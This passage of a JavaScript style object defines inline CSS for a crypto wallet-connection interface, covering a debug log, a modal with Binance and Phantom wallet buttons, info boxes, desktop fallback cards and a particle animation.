    flexShrink: 0,
    marginTop: '2px'
  },
  
  connectionText: {
    flex: 1
  },
  
  // Debug log styles
  debugLog: {
    background: '#f3f4f6',
    border: '2px solid #e5e7eb',
    borderRadius: '12px',
    padding: '12px',
    marginBottom: '20px',
    maxHeight: '180px',
    overflowY: 'auto',
    fontSize: '11px',
    fontFamily: 'monospace',
    color: '#374151',
    boxShadow: 'inset 0 0 10px rgba(0,0,0,0.1)'
  },
  
  debugHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: '8px',
    position: 'sticky',
    top: 0,
    background: '#f3f4f6',
    paddingBottom: '4px',
    zIndex: 1
  },
  
  copyButton: {
    background: '#6b7280',
    color: 'white',
    border: 'none',
    padding: '4px 8px',
    borderRadius: '4px',
    fontSize: '10px',
    cursor: 'pointer',
    transition: 'all 0.2s',
    fontWeight: 'bold'
  },
  
  debugEntry: (info) => ({
    padding: '3px 0', 
    borderBottom: '1px solid #e5e7eb',
    fontSize: '10px',
    lineHeight: '1.4',
    color: info.includes('✅') ? '#059669' : 
           info.includes('⚠️') ? '#ca8a04' : 
           info.includes('❌') ? '#dc2626' : '#4b5563'
  }),
  
  // Modal styles
  modalOverlay: {
    position: 'fixed',
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    background: 'rgba(0,0,0,0.75)',
    backdropFilter: 'blur(8px)',
    zIndex: 100,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: '20px',
    animation: 'fadeIn 0.2s',
    WebkitTapHighlightColor: 'transparent'
  },
  
  modalContent: {
    background: 'white',
    borderRadius: '24px',
    padding: '30px',
    maxWidth: '400px',
    width: '100%',
    boxShadow: '0 25px 50px rgba(0,0,0,0.5)',
    animation: 'slideUp 0.3s ease-out',
    border: '1px solid rgba(255,255,255,0.2)',
    position: 'relative',
    overflow: 'hidden'
  },
  
  modalHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: '24px'
  },
  
  modalTitle: {
    fontSize: '24px',
    fontWeight: 'bold',
    color: '#1f2937',
    margin: 0,
    display: 'flex',
    alignItems: 'center',
    gap: '10px'
  },
  
  closeButton: {
    background: 'transparent',
    border: 'none',
    fontSize: '28px',
    color: '#9ca3af',
    cursor: 'pointer',
    padding: '0',
    width: '32px',
    height: '32px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: '8px',
    transition: 'all 0.2s'
  },
  
  modalDescription: {
    color: '#6b7280',
    fontSize: '14px',
    marginBottom: '24px',
    lineHeight: '1.5',
    textAlign: 'center'
  },
  
  walletOptions: {
    display: 'flex',
    flexDirection: 'column',
    gap: '12px'
  },
  
  binanceButton: {
    width: '100%',
    background: 'linear-gradient(135deg, #f0b90b 0%, #f8d12f 100%)',
    color: '#1e1e1e',
    border: 'none',
    padding: '16px 20px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    cursor: 'pointer',
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    transition: 'all 0.3s',
    boxShadow: '0 4px 12px rgba(240, 185, 11, 0.3)'
  },
  
  phantomButton: {
    width: '100%',
    background: 'linear-gradient(135deg, #ab9ff2 0%, #9281f5 100%)',
    color: 'white',
    border: 'none',
    padding: '16px 20px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    cursor: 'pointer',
    display: 'flex',
    alignItems: 'center',
    gap: '12px',
    transition: 'all 0.3s',
    boxShadow: '0 4px 12px rgba(171, 159, 242, 0.3)'
  },
  
  walletIcon: {
    width: '40px',
    height: '40px',
    background: 'white',
    borderRadius: '10px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    fontSize: '24px',
    flexShrink: 0,
    boxShadow: '0 2px 6px rgba(0,0,0,0.1)'
  },
  
  walletDetails: {
    flex: 1,
    textAlign: 'left'
  },
  
  walletName: {
    fontSize: '16px',
    fontWeight: 'bold'
  },
  
  walletSubtext: {
    fontSize: '12px',
    opacity: 0.8,
    marginTop: '2px'
  },
  
  securityInfo: {
    marginTop: '24px',
    padding: '16px',
    background: '#f9fafb',
    borderRadius: '12px',
    fontSize: '12px',
    color: '#6b7280',
    lineHeight: '1.5',
    border: '1px solid #e5e7eb'
  },
  
  securityTitle: {
    fontWeight: '600',
    color: '#374151',
    marginBottom: '8px',
    display: 'flex',
    alignItems: 'center',
    gap: '8px'
  },
  
  securityText: {
    fontSize: '12px'
  },
  
  binanceTip: {
    marginTop: '16px',
    padding: '12px',
    background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
    borderRadius: '12px',
    fontSize: '11px',
    color: '#1e40af',
    textAlign: 'center',
    border: '1px solid #93c5fd'
  },
  
  // Desktop styles
  desktopContainer: {
    minHeight: '100vh',
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    padding: '20px',
    fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif'
  },
  
  desktopCard: {
    background: 'white',
    borderRadius: '24px',
    padding: '40px',
    maxWidth: '500px',
    textAlign: 'center',
    boxShadow: '0 20px 60px rgba(0,0,0,0.3)',
    border: '1px solid rgba(255,255,255,0.5)'
  },
  
  desktopTitle: {
    fontSize: '28px',
    marginBottom: '16px',
    color: '#1f2937',
    fontWeight: 'bold'
  },
  
  desktopText: {
    color: '#6b7280',
    lineHeight: '1.6',
    marginBottom: '24px',
    fontSize: '16px'
  },
  
  urlBox: {
    background: '#f3f4f6',
    padding: '16px',
    borderRadius: '12px',
    fontSize: '14px',
    color: '#374151',
    marginBottom: '20px',
    wordBreak: 'break-all'
  },
  
  urlCode: {
    fontSize: '13px',
    fontFamily: 'monospace'
  },
  
  tipBox: {
    background: '#fef3c7',
    padding: '12px',
    borderRadius: '8px',
    fontSize: '13px',
    color: '#92400e',
    marginBottom: '16px'
  },
  
  refreshButton: {
    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
    color: 'white',
    border: 'none',
    padding: '12px 24px',
    borderRadius: '12px',
    fontSize: '16px',
    fontWeight: 'bold',
    cursor: 'pointer',
    transition: 'all 0.3s',
    boxShadow: '0 4px 12px rgba(102, 126, 234, 0.3)'
  },
  
  binanceDetectedBox: {
    marginTop: '20px',
    padding: '12px',
    background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
    borderRadius: '8px',
    fontSize: '13px',
    color: '#1e40af',
    border: '1px solid #93c5fd'
  },
  
  // Footer and notice styles
  footer: {
    marginTop: '24px',
    textAlign: 'center',
    color: 'rgba(255,255,255,0.85)',
    fontSize: '13px',
    lineHeight: '1.5'
  },
  
  footerText: {
    marginTop: '16px',
    fontSize: '12px',
    color: '#6b7280',
    textAlign: 'center',
    lineHeight: '1.5'
  },
  
  binanceNotice: {
    background: 'linear-gradient(135deg, #dbeafe 0%, #bfdbfe 100%)',
    border: '2px solid #93c5fd',
    borderRadius: '12px',
    padding: '16px',
    marginBottom: '20px',
    color: '#1e40af',
    fontSize: '14px',
    fontWeight: '600',
    lineHeight: '1.5',
    animation: 'pulse 2s infinite'
  },
  
  // Particle animation
  particle: (p) => ({
    position: 'absolute',
    width: `${p.size}px`,
    height: `${p.size}px`,
    background: 'rgba(255,255,255,0.5)',
    borderRadius: '50%',
    left: `${p.left}%`,
    animation: `float ${p.duration}s ease-in-out infinite`,
    animationDelay: `${p.delay}s`,
    zIndex: 2
  })
};
